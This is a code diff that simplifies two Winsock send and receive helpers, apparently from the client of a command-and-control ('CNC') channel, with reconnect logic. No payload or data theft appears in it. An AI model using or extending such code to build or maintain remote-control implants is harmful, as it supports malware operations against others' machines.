@@ -104,38 +104,30 @@ int send_to_cnc(void *buf, size_t len)
 {
     int ret;
 
-    while (TRUE)
+    ret = send(cnc_sock, buf, len, 0);
+    if (ret == SOCKET_ERROR)
+        fatal_error("Error at send(): %ld", WSAGetLastError());
+    if (!ret)
     {
-        ret = send(cnc_sock, buf, len, 0);
-        if (ret == SOCKET_ERROR)
-            fatal_error("Error at send(): %ld", WSAGetLastError());
-        if (!ret)
-        {
-            log_error("Connection with CNC broke.");
-            reconnect_to_cnc();
-            return 0;
-        }
-        return ret;
+        log_error("Connection with CNC broke.");
+        reconnect_to_cnc();
     }
+    return ret;
 }
 
 int recv_from_cnc(void *buf, size_t len)
 {
     int ret;
 
-    while (TRUE)
+    ret = recv(cnc_sock, buf, len, 0);
+    if (ret == SOCKET_ERROR)
+        fatal_error("Error at recv(): %ld", WSAGetLastError());
+    if (!ret)
     {
-        ret = recv(cnc_sock, buf, len, 0);
-        if (ret == SOCKET_ERROR)
-            fatal_error("Error at recv(): %ld", WSAGetLastError());
-        if (!ret)
-        {
-            log_error("Connection with CNC broke.");
-            reconnect_to_cnc();
-            return 0;
-        }
-        return ret;
+        log_error("Connection with CNC broke.");
+        reconnect_to_cnc();
     }
+    return ret;
 }
 
 void init_cnc_conn(char *host)
